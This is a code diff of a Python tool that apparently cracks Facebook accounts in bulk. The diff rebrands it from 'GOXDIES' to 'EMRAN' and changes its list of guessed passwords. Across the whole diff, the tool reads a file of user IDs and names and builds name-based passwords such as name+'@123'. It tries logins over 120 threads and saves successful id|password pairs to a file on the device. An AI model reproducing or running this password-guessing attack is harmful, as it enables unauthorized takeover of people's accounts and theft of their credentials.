@@ -1,4 +1,4 @@
-#---EHC CYBER 99 (GOXDIES)
+#---EHC CYBER 99 (EMRAN)
 #Open-source-01 (Gift)
 #-----------------------------------
 import os, random, sys, json, uuid, time
@@ -13,15 +13,11 @@ except:
 li="\033[38;5;46m="
 cox=str(f"{li}"*37)
 logo=f"""
- ▄▄▄       ██▀███  ▄▄▄█████▓
-▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒
-▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░
-░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░ 
- ▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ 
- ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   
-  ▒   ▒▒ ░  ░▒ ░ ▒░    ░    
-  ░   ▒     ░░   ░   ░      
-      ░  ░   ░              
+    \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
+   \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
+  \033[38;5;46m/ __/   \x1b[38;5;196m/ /|_/ / \033[37;1m/ /_/ /\033[33;1m/ /| |  \033[34;1m/  |/ / 
+ \033[38;5;46m/ /___  \x1b[38;5;196m/ /  / / \033[37;1m/ _, _/\033[33;1m/ ___ | \033[34;1m/ /|  /  
+\033[38;5;46m/_____/ \x1b[38;5;196m/_/  /_/ \033[37;1m/_/ |_|\033[33;1m/_/  |_|\033[34;1m/_/ |_/
 \033[38;5;46m================================="""
 def logox():
     os.system('clear')
@@ -31,29 +27,29 @@ def main():
     logox()
     print("  [A] FILE CLONE  |  [B] EXIT TOOL")
     print(cox)
-    want=input("  [•] CHOOSE: ")
+    want=input("  [✓] INPUT+>")
     if want in ["A","a","1","01"]:
         file_iclone()
     elif want in ["B","b","2","02"]:
         print(cox)
-        print("  [•] K, BYE.")
+        print("  [✓] Thanks For using My tool")
         print(cox)
         sys.exit()
     else:
         print(cox)
-        print("  [X] CHOOSE A RIGHT OPTION.")
+        print("  [✓] Input right option")
         print(cox)
         time.sleep(3)
         main()
 
 def file_iclone():
     print(cox)
-    fl=input("  [✓]\033[38;5;46m FILE PATH: ")
+    fl=input("  [✓]\033[38;5;46m File Path:")
     print(cox)
     try:
         fileeee=open(fl,"r").read().splitlines()
     except:
-        print("  [✓] \033[38;5;46mFILE NOT FOUND.")
+        print("  [✓] \033[38;5;46mFile Does not found")
         print(cox)
         sys.exit()
     auto_pass(fileeee)
@@ -62,9 +58,9 @@ def file_iclone():
 
 def auto_pass(fileeee):
     tl=str(len(fileeee))
-    print("  [•] TOTAL ID IN FILE: "+tl)
+    print("  [✓] Total id in File : "+tl)
     print(cox)
-    print("  [•] ID SAVED: /sdcard/GOXDIES.txt")
+    print("  [✓] Id Save: /sdcard/EMRAN.txt")
     print(cox)
     with ThreadPool (max_workers=120) as feel:
         for data in fileeee:
@@ -86,11 +82,11 @@ def auto_pass(fileeee):
                     pwx.append(name1+' 123')
                     pwx.append(name1+'1234')
                     pwx.append(name1+'12345')
+                    pwx.append(name1+'@#')
+                    pwx.append(name1+'@@')
+                    pwx.append(name1+'@@@')
+                    pwx.append(name1+'@')
                     pwx.append(name1+'@123')
-                    pwx.append(name1+'pogi')
-                    pwx.append(name1+'ganda')
-                    pwx.append(name1+'143')
-                    pwx.append(name1+'@143')
             except:pass
             try:
                 mid_name=name.split(" ")[1]
@@ -110,7 +106,6 @@ def auto_pass(fileeee):
                     pwx.append(mid_name+'@123')
                     #-Mix
                     pwx.append(name1+mid_name)
-                    pwx.append(name1+mid_name+'143')
                     pwx.append(name1+mid_name+'12')
                     pwx.append(name1+mid_name+'123')
                     pwx.append(name1+mid_name+'1234')
@@ -121,7 +116,6 @@ def auto_pass(fileeee):
                     pwx.append(name1+mid_name+'@123')
                     pwx.append(name1+' '+mid_name)
                     pwx.append(name1+' '+mid_name+'123')
-                    pwx.append(name1+' '+mid_name+'143')
                     pwx.append(name1+' '+mid_name+'1234')
                     pwx.append(name1+' '+mid_name+'12345')
             except:pass
@@ -150,7 +144,7 @@ oks=[]
 cps=[]
 def file_subb(uid,pwx):
     global oks,loop,cps
-    sys.stdout.write(f"\r  \033[38;5;46m[GOXDIES] {loop}|{str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r  \033[38;5;46m[EMRAN] {loop}|{str(len(oks))}");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in pwx:
@@ -197,12 +191,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [OK] {uid} | {ps}      ")
-                open("/sdcard/GOXDIES-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
-            elif "PLEASE, CONFIRM EMAIL: " in q:
+            elif "Please Confirm Email" in q:
                 print(f"\r\r। [OK] {uid} | {ps}      ")
-                open("/sdcard/GOXDIES-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r  [CP] {uid} | {ps}      ")
